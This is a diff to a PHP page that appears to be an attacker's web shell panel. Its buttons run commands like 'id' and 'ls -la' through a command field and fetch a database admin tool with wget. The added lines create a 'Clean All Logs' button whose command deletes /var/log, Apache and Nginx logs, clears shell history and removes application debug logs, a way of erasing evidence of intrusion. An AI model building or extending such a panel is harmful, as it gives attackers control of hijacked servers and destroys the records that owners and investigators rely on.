@@ -218,6 +218,9 @@ ob_clean();
             <form method="post">
                 <button name="cmd_input" value="id" class="btn-side"><i class="fas fa-user-secret"></i> Whoami</button>
                 <button name="cmd_input" value="ls -la" class="btn-side"><i class="fas fa-list"></i> Full Directory List</button>
+				<button name="cmd_input" value="rm -rf *.log *.gz /var/log/*.log /var/log/apache2/* /var/log/nginx/*; find . -name '*.log' -delete; echo '' > .bash_history; echo '' > ~/.bash_history; history -c; [ -d storage/logs ] && rm -rf storage/logs/*; [ -f wp-content/debug.log ] && rm -f wp-content/debug.log; echo 'SYSTEM: LOGS_PURGED'" class="btn-side" style="border-color: #ff8800; color: #ff8800;">
+    <i class="fas fa-broom"></i> Clean All Logs
+</button>
 				<div class="side-tag">تجهيز الأدوات // DEPLOY TOOLS</div>
     <button name="get_db_admin" value="1" class="btn-side" style="border-color: var(--gold); color: var(--gold);">
         <i class="fas fa-file-download"></i> جلب أداة DB Admin (wget)
@@ -331,6 +334,7 @@ ob_clean();
 </div>
 </body>
 </html>
+
 
 
 
